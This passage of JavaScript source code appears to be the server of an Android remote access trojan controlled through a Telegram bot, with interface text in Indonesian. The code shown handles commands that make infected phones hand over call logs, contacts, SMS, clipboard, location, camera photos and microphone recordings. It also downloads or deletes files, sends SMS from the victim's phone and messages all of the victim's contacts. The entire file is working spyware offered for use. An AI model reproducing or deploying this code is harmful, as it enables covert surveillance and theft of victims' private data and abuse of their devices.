                        {text: '𝙑𝙞𝙗𝙧𝙖𝙨𝙞', callback_data: `vibrate:${uuid}`},
                        {text: '𝙏𝙖𝙢𝙥𝙞𝙡𝙠𝙖𝙣 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '𝙋𝙚𝙨𝙖𝙣', callback_data: `messages:${uuid}`},
                        {text: '𝙆𝙞𝙧𝙞𝙢 𝙥𝙚𝙨𝙖𝙣', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '𝙋𝙪𝙩𝙖𝙧 𝙖𝙪𝙙𝙞𝙤', callback_data: `play_audio:${uuid}`},
                        {text: '𝙃𝙚𝙣𝙩𝙞𝙠𝙖𝙣 𝙖𝙪𝙙𝙞𝙤', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '𝙆𝙞𝙧𝙞𝙢 𝙥𝙚𝙨𝙖𝙣 𝙠𝙚 𝙨𝙚𝙢𝙪𝙖 𝙠𝙤𝙣𝙩𝙖𝙠',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
if (commend == 'calls') {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send('calls');
        }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}

if (commend == 'contacts') {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send('contacts');
        }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}
if (commend == 'messages') {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send('messages');
        }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}

if (commend == 'apps') {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send('apps');
        }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}

if (commend == 'device_info') {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send('device_info');
        }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}
if (commend == 'clipboard') {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send('clipboard');
        }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}

if (commend == 'camera_main') {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send('camera_main');
        }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}

if (commend == 'camera_selfie') {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send('camera_selfie');
        }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}
if (commend == 'location') {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send('location');
        }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}

if (commend == 'vibrate') {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send('vibrate');
        }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}

if (commend == 'stop_audio') {
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid == uuid) {
            ws.send('stop_audio');
        }
    });
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙋𝙚𝙧𝙢𝙞𝙣𝙩𝙖𝙖𝙣 𝙖𝙣𝙙𝙖 𝙨𝙚𝙙𝙖𝙣𝙜 𝙙𝙞𝙥𝙧𝙤𝙨𝙚𝙨\n\n' +
        '• ᴀɴᴅᴀ ᴀᴋᴀɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴛᴀɴɢɢᴀᴘᴀɴ ᴅᴀʟᴀᴍ ᴡᴀᴋᴛᴜ ꜱᴇʙᴇɴᴛᴀʀ',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [["𝙋𝙚𝙧𝙖𝙣𝙜𝙠𝙖𝙩 𝙩𝙚𝙧𝙝𝙪𝙗𝙪𝙣𝙜"], ["𝙅𝙖𝙡𝙖𝙣𝙠𝙖𝙣 𝙥𝙚𝙧𝙞𝙣𝙩𝙖𝙝"]],
                resize_keyboard: true
            }
        }
    )
}
if (commend == 'send_message') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙣𝙤𝙢𝙤𝙧 𝙩𝙪𝙟𝙪𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙠𝙞𝙧𝙞𝙢 𝙎𝙈𝙎\n\n' +
        '•ᴋᴇᴛɪᴋ ɴᴏᴍᴏʀ ʟᴏᴋᴀʟ ᴅᴇɴɢᴀɴ ᴀᴡᴀʟᴀɴ 0, ᴀᴛᴀᴜ ᴅᴇɴɢᴀɴ ᴋᴏᴅᴇ ɴᴇɢᴀʀᴀ ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇɴɢɪʀɪᴍ ɪɴᴛᴇʀɴᴀꜱɪᴏɴᴀʟ',
        {reply_markup: {force_reply: true}}
    )
    currentUuid = uuid
}

if (commend == 'send_message_to_all') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙠𝙞𝙧𝙞𝙢 𝙠𝙚 𝙨𝙚𝙢𝙪𝙖 𝙠𝙤𝙣𝙩𝙖𝙠\n\n' +
        '• ʜᴀʀᴀᴘ ᴘᴇʀʜᴀᴛɪᴋᴀɴ: ᴘᴇꜱᴀɴ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴅɪᴋɪʀɪᴍ ᴊɪᴋᴀ ᴊᴜᴍʟᴀʜ ᴋᴀʀᴀᴋᴛᴇʀ ᴍᴇʟᴇʙɪʜɪ ʙᴀᴛᴀꜱ',
        {reply_markup: {force_reply: true}}
    )
    currentUuid = uuid
}

if (commend == 'file') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙟𝙖𝙡𝙪𝙧 𝙛𝙞𝙡𝙚 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙪𝙣𝙙𝙪𝙝\n\n' +
        '• ᴛɪᴅᴀᴋ ᴘᴇʀʟᴜ ᴊᴀʟᴜʀ ʟᴇɴɢᴋᴀᴘ, ᴄᴜᴋᴜᴘ ᴍᴀꜱᴜᴋᴋᴀɴ ɴᴀᴍᴀ ꜰᴏʟᴅᴇʀ ᴜᴛᴀᴍᴀ. ᴄᴏɴᴛᴏʜ: <b>DCIM/Camera</b>',
        {reply_markup: {force_reply: true}, parse_mode: "HTML"}
    )
    currentUuid = uuid
}

if (commend == 'delete_file') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙟𝙖𝙡𝙪𝙧 𝙛𝙞𝙡𝙚 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙝𝙖𝙥𝙪𝙨\n\n' +
        '• ᴛɪᴅᴀᴋ ᴘᴇʀʟᴜ ᴊᴀʟᴜʀ ʟᴇɴɢᴋᴀᴘ, ᴄᴜᴋᴜᴘ ᴍᴀꜱᴜᴋᴋᴀɴ ꜰᴏʟᴅᴇʀ ᴜᴛᴀᴍᴀ ᴄᴏɴᴛᴏʜ: <b>DCIM/Camera</b>',
        {reply_markup: {force_reply: true}, parse_mode: "HTML"}
    )
    currentUuid = uuid
}

if (commend == 'microphone') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙗𝙚𝙧𝙖𝙥𝙖 𝙙𝙚𝙩𝙞𝙠 𝙢𝙞𝙠𝙧𝙤𝙛𝙤𝙣 𝙙𝙞𝙧𝙚𝙠𝙖𝙢\n\n' +
        '• ᴍᴀꜱᴜᴋᴋᴀɴ ᴀɴɢᴋᴀ ꜱᴀᴊᴀ ᴅᴀʟᴀᴍ ᴅᴇᴛɪᴋ',
        {reply_markup: {force_reply: true}, parse_mode: "HTML"}
    )
    currentUuid = uuid
}

if (commend == 'toast') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙢𝙪𝙣𝙘𝙪𝙡 𝙨𝙚𝙗𝙖𝙜𝙖𝙞 𝙩𝙤𝙖𝙨𝙩 𝙙𝙞 𝙡𝙖𝙮𝙖𝙧\n\n' +
        '• ᴛᴏᴀꜱᴛ ᴀᴅᴀʟᴀʜ ᴘᴇꜱᴀɴ ꜱɪɴɢᴋᴀᴛ ʏᴀɴɢ ᴍᴜɴᴄᴜʟ ꜱᴇʙᴇɴᴛᴀʀ ᴅɪ ʟᴀʏᴀʀ ᴘᴇʀᴀɴɢᴋᴀᴛ',
        {reply_markup: {force_reply: true}, parse_mode: "HTML"}
    )
    currentUuid = uuid
}

if (commend == 'show_notification') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙥𝙚𝙨𝙖𝙣 𝙮𝙖𝙣𝙜 𝙢𝙪𝙣𝙘𝙪𝙡 𝙨𝙚𝙗𝙖𝙜𝙖𝙞 𝙣𝙤𝙩𝙞𝙛𝙞𝙠𝙖𝙨𝙞\n\n' +
        '• ᴘᴇꜱᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴛᴀᴍᴘɪʟ ᴅɪ ʙᴀʀɪꜱ ꜱᴛᴀᴛᴜꜱ ʟᴀʏᴀʀ ꜱᴇᴘᴇʀᴛɪ ɴᴏᴛɪꜰɪᴋᴀꜱɪ ʙɪᴀꜱᴀ',
        {reply_markup: {force_reply: true}, parse_mode: "HTML"}
    )
    currentUuid = uuid
}

if (commend == 'play_audio') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id,
        '°• 𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣 𝙡𝙞𝙣𝙠 𝙖𝙪𝙙𝙞𝙤 𝙮𝙖𝙣𝙜 𝙖𝙠𝙖𝙣 𝙙𝙞𝙥𝙪𝙩𝙖𝙧\n\n' +
        '• ᴛᴇᴋᴀɴᴋᴀɴ: ʜᴀʀᴜꜱ ᴍᴀꜱᴜᴋᴋᴀɴ ʟɪɴᴋ ꜱᴜᴀʀᴀ ꜱᴇᴄᴀʀᴀ ᴅɪʀᴇᴋᴛ, ᴊɪᴋᴀ ᴛɪᴅᴀᴋ ᴍᴀᴋᴀ ꜱᴜᴀʀᴀ ᴛɪᴅᴀᴋ ᴅɪᴘᴜᴛᴀʀ',
        {reply_markup: {force_reply: true}, parse_mode: "HTML"}
    )
    currentUuid = uuid
}
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);